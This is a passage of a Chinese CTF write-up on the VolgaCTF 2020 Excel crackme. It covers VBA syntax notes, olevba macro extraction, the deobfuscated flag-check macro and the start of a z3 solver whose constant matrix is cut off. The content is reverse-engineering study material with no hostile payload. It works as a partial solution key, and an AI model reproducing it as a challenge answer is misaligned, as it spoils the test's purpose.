      <title>2020 VolgaCTF</title>
      <link href="/wp-games-2020volgactf/"/>
      <url>/wp-games-2020volgactf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>比赛的时候只做出来excel_crackme, 赛后复现学到了不少~</p><h2 id="VolgaCTF-excel-crackme"><a href="#VolgaCTF-excel-crackme" class="headerlink" title="VolgaCTF_excel_crackme"></a>VolgaCTF_excel_crackme</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="vba"><a href="#vba" class="headerlink" title="vba"></a>vba</h4><p>没遇见过vba语法, 记录一下~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&gt; 不等于, 相当于！==</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Range 引用单元格</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CLng（Expression）（将Expression转换为Long自类型, 即长整型, 其取值范围是－2147483648-2147483647）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cells(*).value 单元格的值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mid()函数返回给定输入字符串中指定数量的字符。</span><br><span class="line">从1开始</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asc()函数返回第一个字母的ascii值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INT()向下取证</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CInt()是对字符类型的数字, 转换成数值类型, 是类型转换</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; 字符串连接</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chr(10):换行, 相当于VBLF</span><br><span class="line">chr(13):回车, 相当于VBCR</span><br></pre></td></tr></table></figure><h4 id="OLEVBA"><a href="#OLEVBA" class="headerlink" title="OLEVBA"></a>OLEVBA</h4><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install -U https://github.com/decalage2/oletools/archive/master.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure><p>版本要求2.7.9以上</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">olevba -c *.xmls // 可以获得excel、word等vba代码</span><br></pre></td></tr></table></figure><p>之后就可以获得代码了, 如下</p><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> VolgaCTF()</span><br><span class="line">    <span class="keyword">Dim</span>  <span class="type">String</span> <span class="keyword">As</span>  <span class="type">String</span></span><br><span class="line">    <span class="keyword">Dim</span> Long_var1 <span class="keyword">As</span>  <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Dim</span> Long_var2 <span class="keyword">As</span>  <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Dim</span> CLAO4r <span class="keyword">As</span>  <span class="type">Long</span></span><br><span class="line">     <span class="type">String</span> = Range(Chr(<span class="number">76</span>) &amp; Chr(<span class="number">&amp;H31</span>) &amp; Chr(Int(<span class="string">&quot;53&quot;</span>)))</span><br><span class="line">    <span class="keyword">For</span> var3 = <span class="number">1</span> <span class="keyword">To</span> Len( <span class="type">String</span>)</span><br><span class="line">        Long_var1 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">For</span> hbzugliakq = <span class="number">1</span> <span class="keyword">To</span> Len( <span class="type">String</span>)</span><br><span class="line">            Long_var2 = <span class="built_in">CInt</span>(Cells(<span class="number">99</span> + var3, <span class="number">99</span> + hbzugliakq).Value)</span><br><span class="line">            rJ1UnHB = <span class="keyword">Mid</span>( <span class="type">String</span>, hbzugliakq, <span class="number">1</span>)</span><br><span class="line">            Long_var1 = Long_var1 + Long_var2 * Asc(rJ1UnHB)</span><br><span class="line">        <span class="keyword">Next</span> hbzugliakq</span><br><span class="line">        CLAO4r = <span class="built_in">CLng</span>(Cells(<span class="number">99</span> + var3, <span class="number">99</span> + Len( <span class="type">String</span>) + <span class="number">1</span>).Value)</span><br><span class="line">        <span class="keyword">If</span> (CLAO4r &lt;&gt; Long_var1) <span class="keyword">Then</span></span><br><span class="line">            MsgBox mWfDCE1CY0a(Chr(<span class="number">350416</span> / <span class="number">2896</span>) &amp; Chr(Int(<span class="string">&quot;114&quot;</span>)) &amp; Chr(Int(<span class="string">&quot;&amp;H72&quot;</span>)) &amp; Chr(Int(<span class="string">&quot;57&quot;</span>)) &amp; Chr(<span class="number">&amp;H56</span>) &amp; Chr(<span class="number">&amp;H75</span>) &amp; <span class="string">&quot;q&quot;</span> &amp; Chr(Int(<span class="string">&quot;113&quot;</span>)) &amp; Chr(<span class="number">4751</span> - <span class="number">4652</span>) &amp; Chr(Int(<span class="string">&quot;69&quot;</span>)) &amp; Chr(<span class="number">&amp;H54</span>) &amp; Chr(<span class="number">&amp;H67</span>) &amp; Chr(Int(<span class="string">&quot;&amp;H59&quot;</span>)) &amp; Chr(<span class="number">102</span>) &amp; <span class="string">&quot;V&quot;</span> &amp; Chr(Int(<span class="string">&quot;86&quot;</span>)))</span><br><span class="line">            <span class="keyword">Exit</span> <span class="keyword">Sub</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Next</span> var3</span><br><span class="line">    MsgBox mWfDCE1CY0a(Chr(Int(<span class="string">&quot;109&quot;</span>)) &amp; <span class="string">&quot;q&quot;</span> &amp; Chr(Int(<span class="string">&quot;49&quot;</span>)) &amp; Chr(Int(<span class="string">&quot;57&quot;</span>)) &amp; Chr(<span class="number">&amp;H56</span>) &amp; Chr(<span class="number">&amp;H65</span>) &amp; Chr(<span class="number">76</span>) &amp; Chr(Int(<span class="string">&quot;112&quot;</span>)) &amp; Chr(Int(<span class="string">&quot;86&quot;</span>)) &amp; <span class="string">&quot;F&quot;</span> &amp; Chr(Int(<span class="string">&quot;114&quot;</span>)) &amp; Chr( - <span class="number">343</span> + <span class="number">395</span>) &amp; Chr(<span class="number">&amp;H32</span>) &amp; Chr(<span class="number">72</span>) &amp; Chr(Int(<span class="string">&quot;&amp;H31&quot;</span>)) &amp; Chr(<span class="number">100</span>))</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>简化代码如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;input&quot;</span></span><br><span class="line">const_number = [?][?]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">        <span class="built_in">sum</span> += (<span class="built_in">ord</span>(string) * const[i][j])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span> != const[i][<span class="built_in">len</span>(string)+<span class="number">1</span>]:</span><br><span class="line">        <span class="string">&quot;fail&quot;</span></span><br></pre></td></tr></table></figure><p>根据猜测, excel文件中存在着常数, 将单元格背景变白可以发现常数(截图截取一部分):</p><p><img src="http://yanxuan.nosdn.127.net/01b3a0a0d82f3b6f9d550369dd692260.png" alt="UTOOLS1585554738591.png"></p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>可以用z3求解满足的的数:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">number = [[<span class="number">620</span>, <span class="number">340</span>, <span class="number">895</span>, -<span class="number">39</span>, <span class="number">945</span>, <span class="number">321</span>, <span class="number">586</span>, <span class="number">487</span>, -<span class="number">935</span>, -<span class="number">641</span>, -<span class="number">233</span>, <span class="number">553</span>, <span class="number">546</span>, <span class="number">389</span>, <span class="number">764</span>, -<span class="number">199</span>, <span class="number">577</span>, -<span class="number">539</span>, <span class="number">547</span>, -<span class="number">50</span>, <span class="number">134</span>, -<span class="number">722</span>, <span class="number">134</span>,</span><br><span class="line">          <span class="number">571</span>, <span class="number">629</span>, -<span class="number">775</span>, <span class="number">499</span>, -<span class="number">633</span>, -<span class="number">928</span>, -<span class="number">103</span>, <span class="number">975</span>, <span class="number">961</span>, -<span class="number">275</span>, <span class="number">136</span>, <span class="number">165</span>, <span class="number">170</span>, <span class="number">257</span>, <span class="number">559</span>, -<span class="number">656</span>, -<span class="number">207</span>, <span class="number">403</span>, -<span class="number">414</span>, <span class="number">371</span>, <span class="number">885</span>, -<span class="number">885</span>, <span class="number">490493</span>],</span><br><span class="line">[-<span class="number">19</span>, <span class="number">85</span>, -<span class="number">456</span>, <span class="number">228</span>, -<span class="number">127</span>, -<span class="number">777</span>, <span class="number">191</span>, <span class="number">605</span>, <span class="number">292</span>, -<span class="number">181</span>, -<span class="number">652</span>, <span class="number">801</span>, -<span class="number">801</span>, -<span class="number">890</span>, -<span class="number">75</span>, <span class="number">214</span>, <span class="number">22</span>, -<span class="number">52</span>, -<span class="number">4</span>, <span class="number">750</span>, <span class="number">678</span>, -<span class="number">300</span>, <span class="number">82</span>,</span><br><span class="line">    <span class="number">965</span>, -<span class="number">889</span>, -<span class="number">342</span>, <span class="number">933</span>, <span class="number">736</span>, -<span class="number">677</span>, <span class="number">945</span>, -<span class="number">191</span>, <span class="number">408</span>, -<span class="number">96</span>, <span class="number">916</span>, -<span class="number">739</span>, <span class="number">454</span>, -<span class="number">941</span>, <span class="number">72</span>, <span class="number">414</span>, -<span class="number">373</span>, <span class="number">150</span>, -<span class="number">535</span>, <span class="number">742</span>, -<span class="number">376</span>, -<span class="number">285</span>, -<span class="number">7845</span>],</span><br><span class="line">[<span class="number">598</span>, <span class="number">357</span>, <span class="number">236</span>, <span class="number">8</span>, -<span class="number">163</span>, <span class="number">787</span>, -<span class="number">996</span>, <span class="number">26</span>, -<span class="number">685</span>, <span class="number">257</span>, -<span class="number">620</span>, -<span class="number">959</span>, <span class="number">340</span>, -<span class="number">530</span>, -<span class="number">621</span>, <span class="number">634</span>, -<span class="number">701</span>, -<span class="number">112</span>, <span class="number">737</span>, -<span class="number">781</span>, <span class="number">66</span>, <span class="number">517</span>, <span class="number">566</span>, -<span class="number">915</span>,</span><br><span class="line">    <span class="number">907</span>, -<span class="number">818</span>, -<span class="number">487</span>, -<span class="number">82</span>, -<span class="number">115</span>, <span class="number">313</span>, <span class="number">414</span>, <span class="number">836</span>, <span class="number">774</span>, -<span class="number">776</span>, -<span class="number">551</span>, <span class="number">920</span>, -<span class="number">548</span>, <span class="number">898</span>, -<span class="number">198</span>, <span class="number">244</span>, <span class="number">822</span>, -<span class="number">741</span>, -<span class="number">185</span>, -<span class="number">589</span>, <span class="number">202</span>, -<span class="number">54593</span>],</span><br><span class="line">[<span class="number">967</span>, -<span class="number">357</span>, -<span class="number">421</span>, -<span class="number">752</span>, -<span class="number">315</span>, <span class="number">413</span>, <span class="number">991</span>, <span class="number">350</span>, <span class="number">873</span>, -<span class="number">122</span>, <span class="number">12</span>, -<span class="number">463</span>, -<span class="number">942</span>, <span class="number">576</span>, <span class="number">657</span>, -<span class="number">108</span>, -<span class="number">375</span>, <span class="number">481</span>, <span class="number">622</span>, -<span class="number">550</span>, -<span class="number">910</span>, <span class="number">167</span>, -<span class="number">184</span>, -</span><br><span class="line">    <span class="number">392</span>, -<span class="number">111</span>, <span class="number">457</span>, -<span class="number">606</span>, <span class="number">31</span>, -<span class="number">350</span>, <span class="number">583</span>, -<span class="number">716</span>, <span class="number">57</span>, <span class="number">985</span>, <span class="number">842</span>, <span class="number">222</span>, <span class="number">605</span>, -<span class="number">239</span>, -<span class="number">250</span>, <span class="number">280</span>, <span class="number">579</span>, -<span class="number">109</span>, -<span class="number">297</span>, -<span class="number">99</span>, -<span class="number">222</span>, <span class="number">605</span>, <span class="number">210672</span>],</span><br><span class="line">[-<span class="number">874</span>, -<span class="number">571</span>, <span class="number">298</span>, <span class="number">241</span>, -<span class="number">862</span>, -<span class="number">863</span>, <span class="number">439</span>, <span class="number">518</span>, <span class="number">702</span>, -<span class="number">237</span>, -<span class="number">885</span>, -<span class="number">676</span>, <span class="number">280</span>, -<span class="number">461</span>, <span class="number">756</span>, -<span class="number">7</span>, -<span class="number">4</span>, -<span class="number">278</span>, <span class="number">717</span>, -<span class="number">913</span>, <span class="number">287</span>, <span class="number">625</span>, -<span class="number">821</span>,</span><br><span class="line">    <span class="number">681</span>, -<span class="number">940</span>, <span class="number">150</span>, -<span class="number">433</span>, -<span class="number">866</span>, -<span class="number">648</span>, <span class="number">817</span>, -<span class="number">559</span>, <span class="number">385</span>, -<span class="number">521</span>, -<span class="number">703</span>, -<span class="number">86</span>, -<span class="number">278</span>, -<span class="number">301</span>, <span class="number">444</span>, -<span class="number">447</span>, <span class="number">69</span>, -<span class="number">635</span>, -<span class="number">178</span>, <span class="number">787</span>, <span class="number">766</span>, <span class="number">584</span>, -<span class="number">407144</span>],</span><br><span class="line">[<span class="number">742</span>, <span class="number">811</span>, <span class="number">851</span>, <span class="number">366</span>, -<span class="number">213</span>, <span class="number">994</span>, <span class="number">838</span>, -<span class="number">710</span>, <span class="number">852</span>, <span class="number">787</span>, -<span class="number">997</span>, <span class="number">657</span>, -<span class="number">337</span>, <span class="number">126</span>, <span class="number">165</span>, <span class="number">138</span>, <span class="number">821</span>, <span class="number">340</span>, <span class="number">960</span>, -<span class="number">55</span>, -<span class="number">676</span>, -<span class="number">445</span>, -<span class="number">369</span>, -</span><br><span class="line">    <span class="number">525</span>, <span class="number">605</span>, <span class="number">606</span>, <span class="number">306</span>, <span class="number">472</span>, -<span class="number">946</span>, -<span class="number">565</span>, -<span class="number">224</span>, <span class="number">681</span>, -<span class="number">937</span>, <span class="number">6</span>, <span class="number">784</span>, <span class="number">6</span>, <span class="number">543</span>, -<span class="number">299</span>, -<span class="number">203</span>, -<span class="number">834</span>, <span class="number">963</span>, -<span class="number">762</span>, -<span class="number">706</span>, <span class="number">851</span>, -<span class="number">119</span>, <span class="number">533417</span>],</span><br><span class="line">[-<span class="number">933</span>, <span class="number">546</span>, -<span class="number">626</span>, -<span class="number">24</span>, <span class="number">285</span>, <span class="number">893</span>, <span class="number">838</span>, <span class="number">573</span>, <span class="number">33</span>, -<span class="number">469</span>, -<span class="number">221</span>, -<span class="number">318</span>, -<span class="number">591</span>, -<span class="number">209</span>, <span class="number">332</span>, <span class="number">525</span>, -<span class="number">126</span>, -<span class="number">82</span>, -<span class="number">116</span>, <span class="number">567</span>, <span class="number">155</span>, <span class="number">357</span>, -<span class="number">772</span>, -</span><br><span class="line">    <span class="number">951</span>, -<span class="number">349</span>, -<span class="number">472</span>, -<span class="number">774</span>, -<span class="number">979</span>, <span class="number">346</span>, <span class="number">115</span>, -<span class="number">45</span>, -<span class="number">132</span>, -<span class="number">795</span>, -<span class="number">161</span>, <span class="number">373</span>, <span class="number">344</span>, -<span class="number">910</span>, <span class="number">747</span>, <span class="number">469</span>, <span class="number">105</span>, <span class="number">159</span>, <span class="number">985</span>, -<span class="number">77</span>, -<span class="number">262</span>, -<span class="number">225</span>, -<span class="number">320176</span>],</span><br><span class="line">[-<span class="number">913</span>, -<span class="number">741</span>, -<span class="number">707</span>, <span class="number">915</span>, <span class="number">754</span>, -<span class="number">495</span>, -<span class="number">685</span>, -<span class="number">931</span>, <span class="number">131</span>, <span class="number">347</span>, <span class="number">372</span>, -<span class="number">343</span>, -<span class="number">406</span>, <span class="number">783</span>, -<span class="number">910</span>, -<span class="number">77</span>, <span class="number">28</span>, <span class="number">283</span>, <span class="number">685</span>, -<span class="number">649</span>, -<span class="number">392</span>, <span class="number">446</span>, -<span class="number">12</span>,</span><br><span class="line">    <span class="number">568</span>, -<span class="number">918</span>, -<span class="number">849</span>, <span class="number">984</span>, <span class="number">747</span>, -<span class="number">447</span>, -<span class="number">781</span>, <span class="number">837</span>, -<span class="number">484</span>, <span class="number">758</span>, -<span class="number">434</span>, <span class="number">425</span>, -<span class="number">631</span>, -<span class="number">154</span>, <span class="number">858</span>, -<span class="number">630</span>, <span class="number">563</span>, <span class="number">670</span>, -<span class="number">328</span>, -<span class="number">428</span>, <span class="number">530</span>, -<span class="number">443</span>, -<span class="number">83622</span>],</span><br><span class="line">[-<span class="number">853</span>, -<span class="number">767</span>, -<span class="number">218</span>, -<span class="number">405</span>, <span class="number">147</span>, -<span class="number">605</span>, <span class="number">319</span>, -<span class="number">586</span>, <span class="number">907</span>, <span class="number">971</span>, <span class="number">531</span>, <span class="number">465</span>, -<span class="number">803</span>, <span class="number">271</span>, <span class="number">608</span>, <span class="number">801</span>, <span class="number">982</span>, -<span class="number">962</span>, <span class="number">446</span>, -<span class="number">637</span>, -<span class="number">436</span>, <span class="number">980</span>, <span class="number">51</span>,</span><br><span class="line">    <span class="number">758</span>, -<span class="number">746</span>, <span class="number">796</span>, <span class="number">448</span>, <span class="number">536</span>, -<span class="number">483</span>, -<span class="number">288</span>, -<span class="number">917</span>, <span class="number">980</span>, -<span class="number">365</span>, -<span class="number">490</span>, -<span class="number">265</span>, -<span class="number">620</span>, -<span class="number">142</span>, -<span class="number">939</span>, <span class="number">919</span>, <span class="number">821</span>, -<span class="number">934</span>, -<span class="number">646</span>, <span class="number">791</span>, -<span class="number">546</span>, <span class="number">921</span>, <span class="number">147210</span>],</span><br><span class="line">[-<span class="number">972</span>, <span class="number">556</span>, <span class="number">289</span>, <span class="number">522</span>, <span class="number">407</span>, <span class="number">376</span>, -<span class="number">533</span>, -<span class="number">433</span>, <span class="number">22</span>, -<span class="number">227</span>, -<span class="number">951</span>, <span class="number">6</span>, -<span class="number">347</span>, <span class="number">536</span>, <span class="number">290</span>, <span class="number">195</span>, -<span class="number">146</span>, <span class="number">129</span>, -<span class="number">576</span>, -<span class="number">444</span>, -<span class="number">15</span>, -<span class="number">405</span>, -<span class="number">55</span>, -<span class="number">270</span>,</span><br><span class="line">    <span class="number">745</span>, -<span class="number">35</span>, -<span class="number">611</span>, <span class="number">238</span>, -<span class="number">800</span>, -<span class="number">840</span>, <span class="number">614</span>, <span class="number">632</span>, <span class="number">321</span>, -<span class="number">597</span>, -<span class="number">420</span>, -<span class="number">849</span>, -<span class="number">996</span>, -<span class="number">881</span>, -<span class="number">367</span>, -<span class="number">113</span>, <span class="number">614</span>, -<span class="number">654</span>, <span class="number">286</span>, <span class="number">427</span>, <span class="number">5</span>, -<span class="number">344141</span>],</span><br><span class="line">[<span class="number">641</span>, <span class="number">496</span>, <span class="number">18</span>, -<span class="number">939</span>, <span class="number">480</span>, <span class="number">453</span>, <span class="number">224</span>, <span class="number">721</span>, -<span class="number">826</span>, -<span class="number">148</span>, <span class="number">76</span>, -<span class="number">491</span>, <span class="number">270</span>, <span class="number">684</span>, -<span class="number">265</span>, <span class="number">574</span>, -<span class="number">548</span>, <span class="number">507</span>, <span class="number">644</span>, -<span class="number">792</span>, -<span class="number">39</span>, <span class="number">237</span>, <span class="number">185</span>, <span class="number">893</span>,</span><br><span class="line">    <span class="number">488</span>, <span class="number">423</span>, <span class="number">837</span>, -<span class="number">184</span>, -<span class="number">415</span>, <span class="number">28</span>, -<span class="number">172</span>, -<span class="number">86</span>, <span class="number">574</span>, -<span class="number">284</span>, -<span class="number">702</span>, <span class="number">396</span>, <span class="number">949</span>, -<span class="number">372</span>, <span class="number">951</span>, -<span class="number">221</span>, <span class="number">286</span>, -<span class="number">336</span>, -<span class="number">793</span>, <span class="number">417</span>, <span class="number">645</span>, <span class="number">507384</span>],</span><br><span class="line">[<span class="number">265</span>, <span class="number">870</span>, -<span class="number">466</span>, -<span class="number">520</span>, -<span class="number">305</span>, -<span class="number">730</span>, <span class="number">756</span>, -<span class="number">957</span>, -<span class="number">178</span>, <span class="number">934</span>, <span class="number">136</span>, <span class="number">294</span>, <span class="number">398</span>, <span class="number">728</span>, <span class="number">694</span>, -<span class="number">700</span>, -<span class="number">161</span>, -<span class="number">477</span>, -<span class="number">558</span>, <span class="number">148</span>, <span class="number">514</span>, <span class="number">349</span>, <span class="number">921</span>,</span><br><span class="line">    <span class="number">348</span>, <span class="number">514</span>, -<span class="number">952</span>, -<span class="number">778</span>, <span class="number">741</span>, -<span class="number">57</span>, -<span class="number">564</span>, <span class="number">530</span>, -<span class="number">97</span>, -<span class="number">303</span>, <span class="number">953</span>, <span class="number">147</span>, -<span class="number">946</span>, <span class="number">742</span>, <span class="number">823</span>, <span class="number">24</span>, -<span class="number">538</span>, -<span class="number">102</span>, <span class="number">710</span>, <span class="number">796</span>, <span class="number">351</span>, <span class="number">121</span>, <span class="number">429295</span>],</span><br><span class="line">[-<span class="number">127</span>, <span class="number">308</span>, -<span class="number">696</span>, -<span class="number">718</span>, <span class="number">824</span>, <span class="number">654</span>, -<span class="number">825</span>, -<span class="number">551</span>, -<span class="number">519</span>, -<span class="number">303</span>, -<span class="number">511</span>, <span class="number">671</span>, -<span class="number">169</span>, -<span class="number">887</span>, <span class="number">353</span>, -<span class="number">749</span>, -<span class="number">924</span>, <span class="number">912</span>, <span class="number">858</span>, <span class="number">541</span>, -<span class="number">701</span>, <span class="number">472</span>, -<span class="number">12</span>,</span><br><span class="line">    <span class="number">208</span>, -<span class="number">386</span>, <span class="number">75</span>, <span class="number">30</span>, <span class="number">27</span>, <span class="number">827</span>, <span class="number">934</span>, <span class="number">471</span>, <span class="number">156</span>, <span class="number">586</span>, -<span class="number">278</span>, <span class="number">412</span>, -<span class="number">81</span>, -<span class="number">958</span>, -<span class="number">391</span>, -<span class="number">531</span>, -<span class="number">913</span>, -<span class="number">991</span>, -<span class="number">211</span>, -<span class="number">814</span>, -<span class="number">338</span>, <span class="number">610</span>, -<span class="number">272727</span>],</span><br><span class="line">[-<span class="number">486</span>, <span class="number">934</span>, <span class="number">153</span>, <span class="number">439</span>, <span class="number">623</span>, <span class="number">320</span>, <span class="number">361</span>, -<span class="number">781</span>, <span class="number">573</span>, <span class="number">95</span>, <span class="number">658</span>, -<span class="number">43</span>, -<span class="number">27</span>, -<span class="number">441</span>, -<span class="number">228</span>, <span class="number">596</span>, <span class="number">614</span>, <span class="number">467</span>, -<span class="number">937</span>, -<span class="number">823</span>, -<span class="number">3</span>, -<span class="number">567</span>, -<span class="number">689</span>, -</span><br><span class="line">    <span class="number">507</span>, <span class="number">372</span>, <span class="number">842</span>, -<span class="number">11</span>, -<span class="number">755</span>, <span class="number">259</span>, <span class="number">251</span>, -<span class="number">950</span>, <span class="number">698</span>, <span class="number">489</span>, <span class="number">297</span>, -<span class="number">792</span>, -<span class="number">162</span>, <span class="number">728</span>, -<span class="number">897</span>, <span class="number">718</span>, <span class="number">28</span>, <span class="number">513</span>, -<span class="number">814</span>, <span class="number">653</span>, <span class="number">163</span>, <span class="number">780</span>, <span class="number">309196</span>],</span><br><span class="line">[<span class="number">863</span>, <span class="number">695</span>, -<span class="number">670</span>, -<span class="number">103</span>, <span class="number">150</span>, -<span class="number">592</span>, -<span class="number">39</span>, <span class="number">197</span>, -<span class="number">819</span>, -<span class="number">977</span>, -<span class="number">513</span>, -<span class="number">997</span>, -<span class="number">895</span>, <span class="number">718</span>, <span class="number">501</span>, <span class="number">168</span>, -<span class="number">505</span>, <span class="number">399</span>, -<span class="number">593</span>, <span class="number">98</span>, <span class="number">254</span>, <span class="number">983</span>, -<span class="number">416</span>,</span><br><span class="line">    <span class="number">288</span>, <span class="number">20</span>, -<span class="number">826</span>, -<span class="number">965</span>, <span class="number">353</span>, -<span class="number">925</span>, <span class="number">756</span>, <span class="number">546</span>, -<span class="number">443</span>, <span class="number">752</span>, <span class="number">359</span>, <span class="number">343</span>, <span class="number">848</span>, -<span class="number">666</span>, -<span class="number">249</span>, -<span class="number">752</span>, -<span class="number">617</span>, <span class="number">470</span>, <span class="number">617</span>, <span class="number">337</span>, -<span class="number">432</span>, <span class="number">73</span>, -<span class="number">247072</span>],</span><br><span class="line">[-<span class="number">164</span>, -<span class="number">912</span>, <span class="number">580</span>, -<span class="number">267</span>, -<span class="number">731</span>, <span class="number">51</span>, <span class="number">405</span>, <span class="number">618</span>, <span class="number">35</span>, -<span class="number">8</span>, <span class="number">367</span>, -<span class="number">118</span>, -<span class="number">706</span>, -<span class="number">445</span>, <span class="number">157</span>, -<span class="number">426</span>, -<span class="number">471</span>, -<span class="number">583</span>, -<span class="number">632</span>, <span class="number">40</span>, <span class="number">326</span>, <span class="number">947</span>, -<span class="number">473</span>, -<span class="number">169</span>,</span><br><span class="line">    <span class="number">655</span>, -<span class="number">647</span>, <span class="number">620</span>, <span class="number">110</span>, -<span class="number">347</span>, -<span class="number">646</span>, <span class="number">127</span>, -<span class="number">444</span>, -<span class="number">95</span>, -<span class="number">679</span>, <span class="number">557</span>, -<span class="number">225</span>, -<span class="number">777</span>, -<span class="number">58</span>, -<span class="number">528</span>, -<span class="number">800</span>, <span class="number">931</span>, -<span class="number">628</span>, <span class="number">25</span>, -<span class="number">497</span>, <span class="number">639</span>, -<span class="number">382979</span>],</span><br><span class="line">[<span class="number">900</span>, -<span class="number">14</span>, <span class="number">496</span>, -<span class="number">465</span>, -<span class="number">910</span>, -<span class="number">724</span>, -<span class="number">460</span>, <span class="number">158</span>, <span class="number">452</span>, -<span class="number">2</span>, -<span class="number">547</span>, <span class="number">682</span>, <span class="number">588</span>, <span class="number">968</span>, <span class="number">915</span>, -<span class="number">304</span>, -<span class="number">146</span>, <span class="number">743</span>, -<span class="number">632</span>, -<span class="number">511</span>, -<span class="number">488</span>, -<span class="number">840</span>, <span class="number">436</span>, -</span><br><span class="line">    <span class="number">175</span>, <span class="number">391</span>, -<span class="number">638</span>, -<span class="number">185</span>, <span class="number">231</span>, <span class="number">39</span>, <span class="number">328</span>, -<span class="number">306</span>, <span class="number">772</span>, <span class="number">382</span>, -<span class="number">96</span>, -<span class="number">349</span>, -<span class="number">663</span>, -<span class="number">123</span>, <span class="number">343</span>, <span class="number">64</span>, -<span class="number">581</span>, <span class="number">173</span>, <span class="number">323</span>, <span class="number">14</span>, <span class="number">396</span>, -<span class="number">736</span>, -<span class="number">29820</span>],</span><br><span class="line">[-<span class="number">511</span>, -<span class="number">304</span>, <span class="number">309</span>, -<span class="number">854</span>, -<span class="number">522</span>, -<span class="number">679</span>, -<span class="number">851</span>, -<span class="number">27</span>, -<span class="number">545</span>, <span class="number">526</span>, <span class="number">636</span>, <span class="number">712</span>, <span class="number">138</span>, <span class="number">275</span>, <span class="number">498</span>, <span class="number">304</span>, <span class="number">335</span>, -<span class="number">731</span>, -<span class="number">746</span>, -<span class="number">688</span>, -<span class="number">27</span>, <span class="number">855</span>, -<span class="number">504</span>,</span><br><span class="line">    <span class="number">89</span>, -<span class="number">370</span>, <span class="number">424</span>, -<span class="number">329</span>, -<span class="number">578</span>, <span class="number">565</span>, -<span class="number">676</span>, <span class="number">358</span>, -<span class="number">305</span>, -<span class="number">752</span>, -<span class="number">733</span>, -<span class="number">948</span>, <span class="number">545</span>, <span class="number">397</span>, -<span class="number">772</span>, -<span class="number">552</span>, -<span class="number">985</span>, <span class="number">502</span>, <span class="number">859</span>, -<span class="number">781</span>, <span class="number">217</span>, -<span class="number">139</span>, -<span class="number">665472</span>],</span><br><span class="line">[<span class="number">390</span>, <span class="number">295</span>, <span class="number">479</span>, -<span class="number">890</span>, -<span class="number">961</span>, -<span class="number">351</span>, -<span class="number">994</span>, <span class="number">256</span>, -<span class="number">82</span>, <span class="number">577</span>, <span class="number">41</span>, <span class="number">202</span>, -<span class="number">568</span>, <span class="number">476</span>, -<span class="number">489</span>, <span class="number">785</span>, -<span class="number">802</span>, -<span class="number">870</span>, <span class="number">193</span>, -<span class="number">694</span>, <span class="number">440</span>, -<span class="number">511</span>, -<span class="number">639</span>, -</span><br><span class="line">    <span class="number">441</span>, <span class="number">901</span>, <span class="number">950</span>, <span class="number">954</span>, -<span class="number">637</span>, <span class="number">247</span>, -<span class="number">864</span>, <span class="number">219</span>, <span class="number">595</span>, -<span class="number">25</span>, <span class="number">184</span>, <span class="number">877</span>, -<span class="number">283</span>, -<span class="number">181</span>, -<span class="number">481</span>, <span class="number">775</span>, <span class="number">814</span>, <span class="number">654</span>, -<span class="number">861</span>, <span class="number">44</span>, -<span class="number">882</span>, -<span class="number">97</span>, -<span class="number">51995</span>],</span><br><span class="line">[-<span class="number">604</span>, -<span class="number">247</span>, -<span class="number">954</span>, -<span class="number">553</span>, -<span class="number">724</span>, -<span class="number">931</span>, <span class="number">726</span>, <span class="number">28</span>, -<span class="number">817</span>, <span class="number">910</span>, -<span class="number">972</span>, <span class="number">152</span>, <span class="number">215</span>, <span class="number">100</span>, -<span class="number">899</span>, -<span class="number">497</span>, -<span class="number">49</span>, <span class="number">29</span>, <span class="number">401</span>, <span class="number">843</span>, <span class="number">729</span>, -<span class="number">190</span>, -<span class="number">784</span>,</span><br><span class="line">    <span class="number">419</span>, <span class="number">427</span>, -<span class="number">70</span>, -<span class="number">290</span>, <span class="number">874</span>, -<span class="number">253</span>, <span class="number">411</span>, -<span 